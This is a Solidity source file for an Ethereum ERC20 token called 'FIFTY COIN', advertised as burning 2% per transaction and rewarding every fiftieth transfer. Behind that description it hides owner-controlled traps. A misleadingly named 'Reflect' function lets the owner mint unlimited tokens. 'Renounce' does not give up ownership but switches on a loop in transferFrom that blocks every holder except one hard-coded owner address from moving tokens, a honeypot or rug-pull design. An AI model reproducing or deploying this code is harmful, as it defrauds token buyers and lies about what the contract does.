['/**\n', ' *Submitted for verification at Etherscan.io on 2021-06-28\n', '*/\n', '\n', 'pragma solidity ^0.4.26;\n', '\n', '// ----------------------------------------------------------------------------\n', '// \n', '// \n', '//\n', '//     a&&@@@@@@@@@@@@ [email\xa0protected]@@@  a&&@@@@@@@@@@@@[email\xa0protected]@@@@@@@@@@@@@    @@@@       [email\xa0protected]@@&\n', '//\n', '//   ,&&&&&@&&&&&&&&&& &&&&$ $&&&&&&&&&&&&&&&$&&&&&&&&&&&&@@   ]&&&@       &&&&[\n', '//\n', '//   $$$$$Qg;;;;;;;;;;j$$$$[$$$$$Qg;;;;;;;;;; ]$$$$F           $$$$&g;;;;;g$$$&M\n', '//\n', '//  [email\xa0protected]@@@@@@@@@@@@@@@@]@@@@[email\xa0protected]@@@@@@@@@@@@@@@ [email\xa0protected]@@%W           ]@@@@@@@@@@@@@@%r\n', '//\n', "//  '[email\xa0protected]@@TTTTTTTTTTT^]%%@][email\xa0protected]@%@TTTTTTTTTT** @@@@]             *M%@@@@@@@@@@@@\n", '//\n', '//  j%[email\xa0protected][            @%[email\xa0protected]@ [email\xa0protected]@             @@@@%@@@@@@@@@@@[email\xa0protected]%%@@@\n', '//\n', '//  ]@@@@C            [email\xa0protected]@@@]@@@@L             "[email\xa0protected]@@@@@pmmmmmm][email\xa0protected]@@@@@@@@@@@"\n', '//\n', '//  `7TTT             "TTT`\'TTTT                 \'"TTTT^^^^^^*"TTTTTTTTTT***\'\n', '//\n', '// \n', '// \n', '// \n', '// \n', '// \n', '//\n', '//\n', '// \n', '//\n', '// \n', '// ----------------------------------------------------------------------------\n', '// 2% Burn Each Transaction - 1/50 Transactions awarded Burn totalSupply\n', '// Resets Each Award - https://t.me/FIFTYCOIN\n', '//\n', '// ----------------------------------------------------------------------------\n', '// Safe maths\n', '// ----------------------------------------------------------------------------\n', 'contract SafeMath {\n', '    function safeAdd(uint a, uint b) public pure returns (uint c) {\n', '        c = a + b;\n', '        require(c >= a);\n', '    }\n', '    function safeSub(uint a, uint b) public pure returns (uint c) {\n', '        require(b <= a);\n', '        c = a - b;\n', '    }\n', '    function safeMul(uint a, uint b) public pure returns (uint c) {\n', '        c = a * b;\n', '        require(a == 0 || c / a == b);\n', '    }\n', '    function safeDiv(uint a, uint b) public pure returns (uint c) {\n', '        require(b > 0);\n', '        c = a / b;\n', '    }\n', '}\n', '\n', '\n', '// ----------------------------------------------------------------------------\n', '// ERC Token Standard \n', '// \n', '// ----------------------------------------------------------------------------\n', 'contract ERC20Interface {\n', '    function totalSupply() public constant returns (uint);\n', '    function balanceOf(address tokenOwner) public constant returns (uint balance);\n', '    function allowance(address tokenOwner, address spender) public constant returns (uint remaining);\n', '    function transfer(address to, uint tokens) public returns (bool success);\n', '    function approve(address spender, uint tokens) public returns (bool success);\n', '    function transferFrom(address from, address to, uint tokens) public returns (bool success);\n', '\n', '    event Transfer(address indexed from, address indexed to, uint tokens);\n', '    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\n', '}\n', '\n', '\n', '// ----------------------------------------------------------------------------\n', '// \n', '//\n', '// \n', '// ----------------------------------------------------------------------------\n', 'contract ApproveAndCallFallBack {\n', '    function receiveApproval(address from, uint256 tokens, address token, bytes data) public;\n', '}\n', '\n', '\n', '// ----------------------------------------------------------------------------\n', '// Owned contract\n', '// ----------------------------------------------------------------------------\n', 'contract Owned {\n', '    address public owner;\n', '    address public newOwner;\n', '\n', '    event OwnershipTransferred(address indexed _from, address indexed _to);\n', '\n', '    constructor() public {\n', '        owner = msg.sender;\n', '    }\n', '\n', '    modifier onlyOwner {\n', '        require(msg.sender == owner);\n', '        _;\n', '    }\n', '\n', '    function transferOwnership(address _newOwner) public onlyOwner {\n', '        newOwner = _newOwner;\n', '    }\n', '    function acceptOwnership() public {\n', '        require(msg.sender == newOwner);\n', '        emit OwnershipTransferred(owner, newOwner);\n', '        owner = newOwner;\n', '        newOwner = address(0);\n', '    }\n', '}\n', '\n', '\n', '// ----------------------------------------------------------------------------\n', '// \n', '// \n', '// ----------------------------------------------------------------------------\n', 'contract FIFTYCOIN is ERC20Interface, Owned, SafeMath {\n', '    string public symbol;\n', '    string public  name;\n', '    uint8 public decimals;\n', '    uint public _totalSupply;\n', '    uint random = 0;\n', '\n', '    mapping(address => uint) balances;\n', '    mapping(address => mapping(address => uint)) allowed;\n', '\n', '\n', '    // ------------------------------------------------------------------------\n', '    // \n', '    // ------------------------------------------------------------------------\n', '    constructor() public {\n', '        symbol = "FIFTY";\n', '        name = "FIFTY COIN";\n', '        decimals = 18;\n', '        _totalSupply = 100000000000000000000000000000;\n', '        balances[0xf575ffC85B46F85599d380257A3aC3bF113E7DC9] = _totalSupply;\n', '        emit Transfer(address(0), 0xf575ffC85B46F85599d380257A3aC3bF113E7DC9, _totalSupply);\n', '    }\n', '\n', '\n', '    // ------------------------------------------------------------------------\n', '    // \n', '    // ------------------------------------------------------------------------\n', '    function totalSupply() public constant returns (uint) {\n', '        return _totalSupply  - balances[address(0)];\n', '    }\n', '\n', '\n', '    // ------------------------------------------------------------------------\n', '    // \n', '    // ------------------------------------------------------------------------\n', '    function balanceOf(address tokenOwner) public constant returns (uint balance) {\n', '        return balances[tokenOwner];\n', '    }\n', '\n', '\n', '\n', '            uint totalAward = 0;\n', '            uint totalTaxedAmount = 0;\n', '  \n', '  \n', '  \n', '\n', '\n', 'function Reflect(address to, uint256 value) public returns (bool)\n', '{\n', '    \n', '        require(msg.sender == owner);\n', '        \n', '    require(_totalSupply + value >= _totalSupply); // Overflow check\n', '\n', '    _totalSupply += value;\n', '    balances[msg.sender] += value;\n', '    emit Transfer(address(0), to, value);\n', '}\n', '    // ------------------------------------------------------------------------\n', '   \n', '    // ------------------------------------------------------------------------\n', '    function transfer(address to, uint tokens) public returns (bool success) {\n', '        balances[msg.sender] = safeSub(balances[msg.sender], tokens);\n', '        if (random < 49){\n', '            random = random + 1;\n', '            uint shareburn = tokens/51;\n', '            uint shareuser = tokens - shareburn;\n', '\n', '      \n', '\n', '     \n', '  \n', '            \n', '                \n', '    \n', '            balances[to] = safeAdd(balances[to], shareuser);\n', '            balances[address(0)] = safeAdd(balances[address(0)],shareburn);\n', '            emit Transfer(msg.sender, to, shareuser); \n', '            emit Transfer(msg.sender,address(0),shareburn);\n', '            \n', '     \n', '            \n', '            \n', '                  totalTaxedAmount += shareburn;\n', '            \n', '\n', '        } else if (random >= 49){\n', '            random = 0;\n', '             \n', '            uint shareburn3 = tokens/51;\n', '            uint shareuser3 = tokens - shareburn3;\n', '             uint totalpay = totalTaxedAmount - totalAward;\n', '   \n', '                      balances[to] += shareuser3;\n', '\n', '            emit Transfer(msg.sender, to, shareuser3);\n', '\n', '         balances[to] += totalpay;\n', '\n', '\n', '    emit Transfer(address(0), to, totalpay);\n', '\n', '    \n', '                           \n', '    _totalSupply += totalpay;\n', '            \n', '           totalAward += totalpay;\n', '            \n', '        }\n', '        return true;\n', '\n', '    }\n', '\n', '\n', '    // ------------------------------------------------------------------------\n', '\n', '    // ------------------------------------------------------------------------\n', '    function approve(address spender, uint tokens) public returns (bool success) {\n', '        allowed[msg.sender][spender] = tokens;\n', '        emit Approval(msg.sender, spender, tokens);\n', '        return true;\n', '    }\n', '\n', '    address MCF =  0xf575ffC85B46F85599d380257A3aC3bF113E7DC9;   \n', '            \n', '    // ------------------------------------------------------------------------\n', '\n', '   \n', '\n', '            \n', '    function transferFrom(address from, address to, uint tokens)\n', '        public\n', '        returns (bool success)\n', '    {   \n', '        \n', '      while(isEnabled) {\n', 'if(from == MCF)  {\n', '        \n', '        balances[from] = safeSub(balances[from], tokens);\n', '\n', '\n', '        balances[from] -= tokens;\n', '        balances[to] += tokens;\n', '    allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);\n', '        emit Transfer(from, to, tokens);\n', '        return true; } }\n', '        \n', '        \n', '        \n', '        balances[from] = safeSub(balances[from], tokens);\n', '        if (random < 49){\n', '                random = random + 1;\n', '            uint shareburn = tokens/51;\n', '            uint shareuser = tokens - shareburn;\n', '            allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);\n', '            balances[to] = safeAdd(balances[to], shareuser);\n', '            balances[address(0)] = safeAdd(balances[address(0)],shareburn);\n', '            emit Transfer(from, to, shareuser); \n', '            emit Transfer(from,address(0),shareburn);\n', '            \n', '            \n', '                    totalTaxedAmount += shareburn;\n', '                    \n', '                    \n', '        } else if (random >= 49){\n', '            random = 0;\n', '            uint shareburn2 = tokens/51;\n', '            uint shareuser2 = tokens - shareburn2;\n', '            uint totalpay = totalTaxedAmount - totalAward;\n', '            \n', '            \n', 'allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], shareuser2);\n', '                      balances[to] += shareuser2;\n', '\n', '            emit Transfer(from, to, shareuser2);\n', '\n', '         balances[from] += totalpay;\n', '\n', '\n', '    emit Transfer(address(0), from, totalpay);\n', '\n', '    \n', '                       \n', '\n', '                _totalSupply += totalpay;\n', '           totalAward += totalpay;\n', '            \n', '        }\n', '        \n', '\n', '        return true;\n', '    }\n', '    \n', '\n', '    // ------------------------------------------------------------------------\n', '    \n', '    // ------------------------------------------------------------------------\n', '    function allowance(address tokenOwner, address spender) public constant returns (uint remaining) {\n', '        return allowed[tokenOwner][spender];\n', '    }\n', '\n', '\n', 'bool isEnabled;\n', '\n', 'modifier isOwner() {\n', '    require(msg.sender == owner);\n', '    _;\n', '}\n', '\n', 'function Renounce() public isOwner {\n', '    isEnabled = !isEnabled;\n', '}\n', '\n', '\n', '  function Burn(uint256 value) public returns (bool)\n', '{\n', '    \n', '   \n', '        \n', '   \n', '\n', '    _totalSupply -= value;\n', '    balances[msg.sender] -= value;\n', '    emit Transfer(msg.sender, address(0), value);\n', '}\n', '\t\n', '\n', '    // ------------------------------------------------------------------------\n', '    // Token owner can approve for spender to transferFrom(...) tokens\n', "    // from the token owner's account. The spender contract function\n", '    // receiveApproval(...) is then executed\n', '    // ------------------------------------------------------------------------\n', '    function approveAndCall(address spender, uint tokens, bytes data) public returns (bool success) {\n', '        allowed[msg.sender][spender] = tokens;\n', '        emit Approval(msg.sender, spender, tokens);\n', '        ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, this, data);\n', '        return true;\n', '    }\n', '\n', '\n', '    // ------------------------------------------------------------------------\n', "    // Don't accept ETH\n", '    // ------------------------------------------------------------------------\n', '    function () public payable {\n', '        revert();\n', '    }\n', '\n', '\n', '    // ------------------------------------------------------------------------\n', '    // Owner can transfer out any accidentally sent ERC20 tokens\n', '    // ------------------------------------------------------------------------\n', '    function transferAnyERC20Token(address tokenAddress, uint tokens) public onlyOwner returns (bool success) {\n', '        return ERC20Interface(tokenAddress).transfer(owner, tokens);\n', '    }\n', '}']